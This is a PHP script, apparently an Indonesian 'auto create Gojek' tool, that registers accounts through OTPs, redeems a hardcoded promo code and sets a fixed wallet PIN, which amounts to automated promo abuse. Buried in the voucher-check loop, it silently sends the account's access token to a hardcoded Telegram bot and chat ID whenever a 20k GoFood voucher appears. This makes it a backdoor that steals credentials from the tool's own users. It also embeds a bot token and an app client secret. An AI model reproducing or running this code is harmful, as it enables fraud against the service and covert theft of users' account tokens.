<?php date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("red","[][][][][][][][][][][][][][][][][][][][][]");
echo color("red","\n[]  Auto Create Gojek X Redeem Voucher  []\n");
echo color("red","[]  Creator : Kentank                   []\n");
echo "[]  Versi   : Premium                   []\n";
echo "[]  Time    : ".date('[d-m-Y] [H:i:s]')."   []\n";
echo "[][][][][][][][][][][][][][][][][][][][][]\n\n";

function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","?] Nomor HP : ");
        $no = trim(fgets(STDIN));
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
        otp:
        echo color("nevy","?] OTP : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","+] Create Account Successfully !");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo "\n".color("nevy","?] Redeem Voucher? (y/n) :");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","===========(REDEEM VOUCHER)===========");
        echo "\n".color("yellow","!] Redeem Voucher 15k");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"G-MPW4WBM"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","+] Message: ".$message);
        goto goride;
        }else{
        echo "\n".color("red","-] Message: ".$message);
        echo "\n".color("yellow","!] Maaf Boss Gabisa :v");
        echo "\n".color("yellow","!] He he he he he");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
	$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
	$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
	$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        echo "\n".color("yellow","!] Total voucher ".$total." : ");
        echo color("green","1. ".$voucher1);
        echo "\n".color("green","                     2. ".$voucher2);
        echo "\n".color("green","                     3. ".$voucher3);
        echo "\n".color("green","                     4. ".$voucher4);
	echo "\n".color("green","                     5. ".$voucher5);
	echo "\n".color("green","                     6. ".$voucher6);
	echo "\n".color("green","                     7. ".$voucher7);
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
	$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
	$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
	$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
                                        $TOKEN  = "931114159:AAGK4O3nuld9uNw_IneDcSPVxYDGAaaazvQ";
					$chatid = "905644289";
                                        if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
					$pesan 	= $token;
					$method	= "sendMessage";
					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
					$post = [
 					'chat_id' => $chatid,
 			        	'text' => $pesan
					];
                                        $header = [
                                        "X-Requested-With: XMLHttpRequest",
                                        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
                                        }
         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
         save("akungojek20k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
         }else{
         save("akungojek10k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
         }
         setpin:
         echo "\n".color("nevy","?] Mau set PIN? : ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" && strpos($no, "628")){
         echo color("red","===============(SET PIN)===============")."\n";
         $data2 = '{"pin":"112233"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "OTP set pin : ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] Access Denied !\n");
         }
         }
         }
         }
         }else{
         goto setpin;
         }
         }else{
         echo color("red","-] OTP yang anda Masukkan salah");
         echo"\n==================================\n\n";
         echo color("yellow","!] Silahkan Masukkan kembali\n");
         goto otp;
         }
         }else{
         echo "Nomor HP sudah terdaftar";
         echo "\nCek Info Akun ? (y/n): ";
         $pilih = trim(fgets(STDIN));
         if($pilih == "y" || $pilih == "Y"){
         echo "\n===============Login================\n";
         echo "Nomor HP : ".$no."\n";
         $datalogin = '{"phone":"+'.$no.'"}';
         $login = request('/v4/customers/login_with_phone', null, $datalogin);
         if(strpos($login, '"login_token"')){
         echo "Kode verifikasi sudah di kirim";
         echo "\nOTP : ";
         $otplogin = trim(fgets(STDIN));
         $logintoken = getStr('"login_token": "','"',$login);
         $datalogin1 = '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otplogin.'","otp_token":"'.$logintoken.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}';
         $veriflogin = request('/v4/customers/login/verify', null, $datalogin1);
         echo $veriflogin;
         $token = getStr('"access_token":"','"',$veriflogin);
         $uuid = getStr('"resource_owner_id":',',',$veriflogin);
         $data2 = '{"pin":"112233"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);

         echo "OTP set pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;;
         }else{
         echo "404 Not Found ! Please Try Again";
         }
         }else{
         echo "\n==============Register==============\n";
         goto ulang;
  }
 }
}
echo change()."\n"; ?>
